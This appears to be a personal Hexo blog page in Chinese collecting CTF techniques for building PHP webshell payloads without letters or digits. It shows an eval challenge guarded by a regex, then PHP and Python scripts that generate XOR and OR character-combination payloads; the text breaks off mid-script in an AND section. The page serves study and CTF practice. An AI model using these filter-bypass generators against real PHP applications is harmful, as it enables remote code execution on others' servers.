@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="ch">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Dsil3nc3">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Dsil3nc3">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="本篇摘抄自yu22x师傅的无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本和p牛的两篇文章无字母数字webshell之提高篇和一些不包含数字和字母的webshell 主要是自己留作一个记录 但是这里有个很重要的一点是这种绕过的方法是使用的php7才有的动态函数特性，PHP7中增加了对此的支持 类似这种 ($a)() 给个题目例子 12345678&lt;?phperror_r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无字母数字webshell">
+<meta property="og:url" content="https://github.com/Dsi13nc3/2021/04/16/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="本篇摘抄自yu22x师傅的无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本和p牛的两篇文章无字母数字webshell之提高篇和一些不包含数字和字母的webshell 主要是自己留作一个记录 但是这里有个很重要的一点是这种绕过的方法是使用的php7才有的动态函数特性，PHP7中增加了对此的支持 类似这种 ($a)() 给个题目例子 12345678&lt;?phperror_r">
+<meta property="og:locale">
+<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202104/14/204027-570612.png">
+<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202104/16/112103-412265.png">
+<meta property="article:published_time" content="2021-04-16T05:07:25.000Z">
+<meta property="article:modified_time" content="2021-04-16T05:08:16.326Z">
+<meta property="article:author" content="Dsil3nc3">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202104/14/204027-570612.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>无字母数字webshell · Ess3nce&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/Ess3nce.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Ess3nce&#39;s blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">无字母数字webshell</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Ess3nce's blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            无字母数字webshell
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Web">Web</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2k</span>阅读时长: <span class="post-count reading-time">10 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/04/16</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>本篇摘抄自yu22x师傅的<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9387?accounttraceid=bb1a0b42b7a14979aa6848bf75ddeb05kggx">无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本</a>和p牛的两篇文章<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell">无字母数字webshell之提高篇</a>和<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p>
+<p>主要是自己留作一个记录</p>
+<p>但是这里有个很重要的一点是这种绕过的方法是使用的php7才有的动态函数特性，PHP7中增加了对此的支持</p>
+<p>类似这种</p>
+<p><code>($a)()</code></p>
+<p>给个题目例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z0-9]/i&#x27;</span>,$code))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$myfile = fopen(<span class="string">&quot;xor.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">$contents=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;<span class="number">256</span> ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($i&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            $hex_i=<span class="string">&#x27;0&#x27;</span>.dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $hex_i=dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            $hex_j=<span class="string">&#x27;0&#x27;</span>.dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $hex_j=dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        $preg = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        $a=<span class="string">&#x27;%&#x27;</span>.$hex_i;</span><br><span class="line">        $b=<span class="string">&#x27;%&#x27;</span>.$hex_j;</span><br><span class="line">        $c=(urldecode($a)^urldecode($b));</span><br><span class="line">        <span class="keyword">if</span> (ord($c)&gt;=<span class="number">32</span>&amp;ord($c)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">            $contents=$contents.$c.<span class="string">&quot; &quot;</span>.$a.<span class="string">&quot; &quot;</span>.$b.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></figure>
+
+<p>这里会得到一个<code>xor.txt</code>文件，然后python写个脚本拼接一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   <span class="comment">#这里加了一个判断是否为空，例如phpinfo()</span></span><br><span class="line">   <span class="keyword">if</span>(arg==<span class="string">&quot;&quot;</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;()&quot;</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=open(<span class="string">&quot;xor.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(input(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(input(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   print(param)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="或"><a href="#或" class="headerlink" title="或"></a>或</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myfile = fopen(<span class="string">&quot;or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">$contents=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;<span class="number">256</span> ; $j++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($i&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            $hex_i=<span class="string">&#x27;0&#x27;</span>.dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $hex_i=dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            $hex_j=<span class="string">&#x27;0&#x27;</span>.dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $hex_j=dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        $preg = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $a=<span class="string">&#x27;%&#x27;</span>.$hex_i;</span><br><span class="line">            $b=<span class="string">&#x27;%&#x27;</span>.$hex_j;</span><br><span class="line">            $c=(urldecode($a)|urldecode($b));</span><br><span class="line">            <span class="keyword">if</span> (ord($c)&gt;=<span class="number">32</span>&amp;ord($c)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                $contents=$contents.$c.<span class="string">&quot; &quot;</span>.$a.<span class="string">&quot; &quot;</span>.$b.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>拼接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   <span class="keyword">if</span>(arg==<span class="string">&quot;&quot;</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;()&quot;</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=open(<span class="string">&quot;or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(input(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(input(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   print(param)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="且"><a href="#且" class="headerlink" title="且"></a>且</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myfile = fopen(<span class="string">&quot;and.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">$contents=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;<span class="number">256</span> ; $j++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($i&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            $hex_i=<span class="string">&#x27;0&#x27;</span>.dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $hex_i=dechex($i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            $hex_j=<span class="string">&#x27;0&#x27;</span>.dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $hex_j=dechex($j);</span><br><span class="line">        &#125;</span><br><span class="line">        $preg = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $a=<span class="string">&#x27;%&#x27;</span>.$hex_i;</span><br><span class="line">            $b=<span class="string">&#x27;%&#x27;</span>.$hex_j;</span><br><span class="line">            $c=(urldecode($a)&amp;urldecode($b));</span><br><span class="line">            <span class="keyword">if</span> (ord($c)&gt;=<span class="number">32</span>&amp;ord($c)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                $contents=$contents.$c.<span class="string">&quot; &quot;</span>.$a.<span class="string">&quot; &quot;</span>.$b.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span 